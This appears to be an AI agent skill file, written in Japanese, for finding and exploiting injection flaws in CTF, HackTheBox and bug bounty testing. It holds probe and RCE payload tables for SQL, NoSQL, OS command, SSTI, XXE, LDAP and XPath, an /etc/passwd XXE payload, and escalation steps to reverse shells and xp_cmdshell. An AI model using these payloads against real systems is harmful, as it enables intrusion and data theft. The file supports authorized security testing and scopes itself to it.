---
name: injection
description: SQL / NoSQL / OS command / SSTI / XXE / LDAP / XPath など注入系脆弱性の判別、深掘り、PoC まで一連で扱う。CTF web の入口検出 / HTB の web 侵入 / bug bounty で発火。SQLi / NoSQLi の深掘りは references/ を参照
category: web
tags:
  - injection
  - sqli
  - nosqli
  - command-injection
  - ssti
  - xxe
  - ldap
---

# Injection

## When to Use

- web パラメータ / cookie / header / JSON field / GraphQL variable など、入力経路を網羅的に試験する
- 単一型に絞る前に、注入族のうちどれが成立しそうか短時間で当たりをつける
- WAF が挟まる場面で、最小プローブから escalate ステップを設計する

**使わない場面**: 認証バイパスのみが目的 (→ `authentication`)、SSRF (→ `server-side`)。

## Approach / Workflow

### Phase 1 — 注入点の列挙

```
入力経路 = {URL params} ∪ {form fields} ∪ {cookies}
        ∪ {arbitrary headers (Referer / User-Agent / X-Forwarded-For / Accept-Language)}
        ∪ {JSON keys/values} ∪ {GraphQL variables}
        ∪ {XML attributes/text} ∪ {filename / multipart name}
```

各入力に対して baseline 応答 (status / body length / time) を控えてから探る。

### Phase 2 — 短時間の判別プローブ

| 注入種別 | プローブ | シグナル |
|---|---|---|
| SQLi (in-band) | `'`, `"`, `\\` | SQL error, syntax error, length 差 |
| SQLi (boolean) | `' AND 1=1-- ` vs `' AND 1=2-- ` | response 差分 |
| SQLi (time) | `' AND SLEEP(5)-- ` (MySQL) / `;WAITFOR DELAY '0:0:5'--` (MSSQL) | 5 秒遅延 |
| NoSQLi | `{"$ne":""}` / `{"$gt":""}` (Mongo)、`'` (CouchDB) | 認証通過 / count 異常 |
| OS command | `;id`, `|id`, `&&id`, `` `id` ``、`$(id)` | uid 含む応答 |
| Blind OS cmd | `;curl <oast>`、`;dig <oast>` | OAST hit |
| SSTI | `{{7*7}}` / `${7*7}` / `<%=7*7%>` | 49 が応答に出る |
| XXE | `<!DOCTYPE x [<!ENTITY foo SYSTEM "file:///etc/passwd">]>...` | passwd content |
| LDAP | `*`, `*)(uid=*`, `admin)(&)` | dn / uid 列挙差 |
| XPath | `' or '1'='1`, `count(/*)` | 全件取得 / 数値漏洩 |

### Phase 3 — 種別ごとの深掘り (variant 選択)

判別が当たったら variant 別の手順に切替える:

| 当たり | 次に読む reference |
|---|---|
| 1 次 SQLi (応答差 / 時間 / error) | `references/sql-manual.md` (手動列挙 + UNION / blind / WAF 回避) |
| SQLi 自動化 (burp request あり / 反復試験) | `references/sql-sqlmap.md` (sqlmap オプション + tamper 設計) |
| 2 次 SQLi (1 次が効かないが保存→消費の経路あり) | `references/sql-second-order.md` (入口/消費 mapping + OAST) |
| NoSQLi (Mongo / CouchDB / Redis) | `references/nosql.md` (operator 注入 + JS 評価 + aggregation) |

SSTI / XXE / OS command / LDAP / XPath は本 SKILL.md 内で完結する短い手順で対応する (SQLi / NoSQLi ほど分岐が多くないため)。

#### OS command injection

- 区切り: `;` `|` `&&` `||` `\n` `$()` `` ` ` ``
- blind 確認は OAST (interactsh / requestbin / canary) DNS / HTTP callback
- argv injection: `--config=...` 形式が走る場合
- file read 経路: `cat /etc/passwd` / `wc -c /etc/shadow` を differential で

#### SSTI (Server-Side Template Injection)

| engine | 確認 payload | RCE payload |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` → 49 | `{{ ''.__class__.__mro__[1].__subclasses__() }}` から `subprocess.Popen` |
| Twig (PHP) | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Velocity (Java) | `#set($x="$x")` `#evaluate(...)` | `$rt.exec("id")` |
| FreeMarker | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` | 同左 |
| Smarty (PHP) | `{php}echo `id`{/php}` (旧) | newer は無効化 |
| Mako (Python) | `${self.module.cache.util.os.popen('id').read()}` | 同左 |
| Pug / Jade (Node) | `#{eval('require("child_process").execSync("id").toString()')}` | 同左 |

#### XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><x>&xxe;</x></root>
```

blind は parameter entity + 外部 DTD で OAST callback。SSRF 経路にもなる (`http://internal-host`)。

#### LDAP / XPath

filter 構造 `(&(uid=USER)(pass=PASS))` に `*)(uid=*` を入れて常時マッチ化。XPath は `' or '1'='1` で同様。

### Phase 4 — エスカレーション

- DB なら schema → users → password hash → secondary RCE 経路 (`xp_cmdshell` / `INTO OUTFILE` / pg_read_server_files)
- OS command なら shell upgrade → reverse shell
- SSTI なら eval → reverse shell
- XXE なら file read → SSRF → metadata
- LDAP なら 認証バイパス → 認可情報の上書き

### Phase 5 — PoC

最小再現 + 影響:

```
1. base 応答
2. 注入入力 + 応答差分
3. 抽出した情報 (DB version, user, file content の最初の 2-3 行)
4. 影響評価
```

## Tools

```
sqlmap       (SQL — references/sql-sqlmap.md 参照)
NoSQLMap     (Mongo)
commix       (OS command)
tplmap       (SSTI)
xxe-injector / xxefilter
ffuf
WebFetch / WebSearch
Bash (sandbox)
```

## Related Skills

- `web-pentester`, `api-security`, `client-side`, `server-side`, `web-app-logic`
- `authentication` (auth bypass 単独狙い)
- `testing-jwt-token-security` (kid SQLi 経由)
- `detection-web` (防御視点での WAF log 読み)

## Rules

1. **スコープ厳守** — 認可済 endpoint のみ。本番 DB に書込み系は試さない
2. **DoS 回避** — `SLEEP(5)` は数回で十分。`SLEEP(60)` を連続実行しない
3. **データ最小取得** — schema 把握まではよいが、ユーザレコードの全件 dump はしない
4. **取得した hash / 機密** — report に生で貼らず、最初/最後の数文字のみ
